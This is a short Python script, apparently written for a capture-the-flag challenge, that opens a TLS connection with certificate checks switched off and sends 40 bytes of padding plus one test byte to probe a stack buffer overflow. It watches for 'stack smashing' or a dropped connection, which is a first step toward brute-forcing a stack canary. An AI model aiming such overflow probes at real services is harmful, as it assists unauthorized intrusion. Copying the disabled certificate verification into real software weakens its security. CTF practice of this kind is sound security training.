import socket
import ssl
import time

HOST = "2b4446b928232a49.julec.tf"
PORT = 1337

def connect():
    try:
        raw = socket.create_connection((HOST, PORT), timeout=5)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ss = ctx.wrap_socket(raw, server_hostname=HOST)
        return ss
    except Exception as e:
        print(f"Conn Error: {e}")
        return None

def test(byte_val, name):
    print(f"Testing {name} (0x{byte_val.hex()})...")
    s = connect()
    if not s: return
    
    # 40 bytes padding + 1 byte test
    payload = b"A"*40 + byte_val
    
    try:
        s.sendall(str(len(payload)).encode() + b"\n")
        time.sleep(0.1)
        s.sendall(payload)
        
        s.settimeout(2.0)
        buf = b""
        crashed = False
        start = time.time()
        while time.time() - start < 3:
            try:
                chunk = s.recv(4096)
                if not chunk: 
                    # Closed connection = Crash (usually)
                    print(f"  -> Connection closed (CRASH suspected).")
                    crashed = True
                    break
                buf += chunk
                if b"stack smashing" in buf:
                    print(f"  -> Stack smashing detected!")
                    crashed = True
                    break
                if b"Santa is missing" in buf:
                    print(f"  -> 'Santa is missing' received (ALIVE).")
                    break
            except TimeoutError:
                print(f"  -> Timeout (ALIVE).")
                break
        s.close()
    except Exception as e:
        print(f"  -> Error: {e}")

test(b"\x00", "Null Byte")
test(b"\x41", "'A' Byte")
